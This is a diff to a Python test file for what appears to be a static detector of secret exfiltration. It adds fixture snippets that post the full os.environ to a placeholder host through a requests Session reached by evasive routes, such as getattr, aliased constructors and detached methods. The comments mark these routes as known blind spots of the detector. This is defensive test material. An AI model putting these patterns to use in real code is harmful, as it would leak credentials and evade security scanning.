@@ -1196,6 +1196,21 @@ def test_python_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
         "import os\nimport requests\n\ns = config\nlist((s := requests.Session()) for _ in [1])\ns.post(host, json=dict(os.environ))\n",
         # A handle reached through an attribute rather than a bare name -- the one-level boundary.
         "import os\nimport requests\n\nclass H:\n    pass\n\nh = H()\nh.s = requests.Session()\nh.s.post(host, json=dict(os.environ))\n",
+        # The rest of the value-reached class (issue #4296, case 4): the handle exists at runtime but
+        # only a value flow reaches it, and value/taint tracking is out of scope for Phase 5 per RFC
+        # #2634. Through a container item...
+        'import os\nimport requests\n\nbox = {"s": requests.Session()}\nbox["s"].post(host, json=dict(os.environ))\n',
+        # ...through a factory return, where the constructor is one call frame away from the sink...
+        "import os\nimport requests\n\ndef make_client():\n    return requests.Session()\n\nmake_client().post(host, json=dict(os.environ))\n",
+        # ...through a constructor aliased to a local name, which is an attribute value rather than
+        # the import alias the evidence chain accepts...
+        "import os\nimport requests\n\nCtor = requests.Session\ns = Ctor()\ns.post(host, json=dict(os.environ))\n",
+        # ...and through a dynamic attribute, where the method name is a string at runtime.
+        'import os\nimport requests\n\ns = requests.Session()\ngetattr(s, "post")(host, json=dict(os.environ))\n',
+        # Sinks invoked as anything other than `name.method(...)` (issue #4296, case 5): the bound
+        # method is detached from its receiver first, so the call site carries no receiver name.
+        "import os\nimport requests\n\ns = requests.Session()\nsend = s.post\nsend(host, json=dict(os.environ))\n",
+        "import os\nimport requests\n\ns = requests.Session()\n[s.post][0](host, json=dict(os.environ))\n",
         # Nested scopes never inherit handles, so define-then-bind is deliberately invisible.
         "import os\nimport requests\n\ndef send():\n    session.post(host, json=dict(os.environ))\n\nsession = requests.Session()\nsend()\n",
         # The inverse ordering is also a cross-scope flow and stays outside the same-scope signal.
